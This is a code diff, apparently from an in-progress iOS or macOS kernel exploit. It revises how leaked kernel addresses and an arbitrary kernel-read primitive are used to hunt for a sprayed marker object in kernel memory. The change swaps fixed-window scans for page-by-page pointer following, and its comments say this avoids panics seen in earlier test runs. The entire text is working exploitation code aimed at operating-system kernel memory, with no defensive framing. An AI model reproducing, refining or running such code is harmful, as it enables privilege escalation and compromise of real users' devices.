@@ -16,7 +16,7 @@
 #define P113_HAS_CS2CORE 1
 #endif
 
-#define P113_BUILD @"p113-descforge-v4"
+#define P113_BUILD @"p113-descforge-v4c"
 #define P113_MAGIC 0x50313333u   /* "P133" marker in body */
 #define P113_NDESC 16u
 
@@ -191,14 +191,36 @@ static NSString *P113Ret(void) {
         if (anchors[1] < 0xfffff00000000000ULL) { anchors[1] = 0; }
         else { p113_log(@"[v4] anchor icmp6filter = 0x%llx", anchors[1]); }
         uint8_t *rb = malloc(0x4000);
-        for (int ai = 0; ai < 2 && !found; ai++) {
-            if (!anchors[ai]) continue;
-            for (uint64_t a = (anchors[ai] - 0x200000) & ~0x3fffULL; a + 0x4000 <= anchors[ai] + 0x200000 && !found; a += 0x4000) {
-                if (g_rd(a, rb, 0x4000) != 0) continue;
-                for (uint32_t i2 = 0; i2 + 16 <= 0x4000; i2 += 4)
-                    if (memcmp(rb + i2, "P133M", 5) == 0) { found = a + i2; break; }
+        /* v4c PAGE LAW (21:34/21:41 mini panics: ± windows abort on
+           unpopulated zone-map pages, ESR 0x96000007) — page-anchored
+           pointer-following only: seeds = anchors' own pages; each next page
+           must be pointed at by a live kernel-range value in a read page. */
+        uint64_t pages[128]; uint32_t npages = 0;
+        for (int si = 0; si < 2; si++) {
+            if (!anchors[si]) continue;
+            uint64_t b = anchors[si] & ~0x3fffULL;
+            int seen0 = 0;
+            for (uint32_t k2 = 0; k2 < npages; k2++) if (pages[k2] == b) { seen0 = 1; break; }
+            if (!seen0 && npages < 128) pages[npages++] = b;
+        }
+        for (uint32_t pi2 = 0; pi2 < npages && pi2 < 128 && !found; pi2++) {
+            uint64_t a = pages[pi2];
+            if (g_rd(a, rb, 0x4000) != 0) continue;
+            for (uint32_t i2 = 0; i2 + 16 <= 0x4000 && !found; i2 += 4)
+                if (memcmp(rb + i2, "P133M", 5) == 0) { found = a + i2; break; }
+            if (found) break;
+            for (uint64_t j = 0; j + 8 <= 0x4000 && npages < 128; j += 8) {
+                uint64_t v; memcpy(&v, rb + j, 8);
+                int inband = (v >= 0xffffffd000000000ULL && v < 0xffffffec00000000ULL) ||
+                             (v >= 0xfffffe1000000000ULL && v < 0xfffffe4000000000ULL);
+                if (!inband) continue;
+                uint64_t pb = v & ~0x3fffULL;
+                int seen = 0;
+                for (uint32_t k2 = 0; k2 < npages; k2++) if (pages[k2] == pb) { seen = 1; break; }
+                if (!seen) pages[npages++] = pb;
             }
         }
+        p113_log(@"[v4c] pages followed=%u (cap 128)", npages);
         free(rb);
     }
     if (!found) { p113_log(@"[-] marker not found in the anchor windows (zone-class scan, honest miss — widen or add anchors)"); }
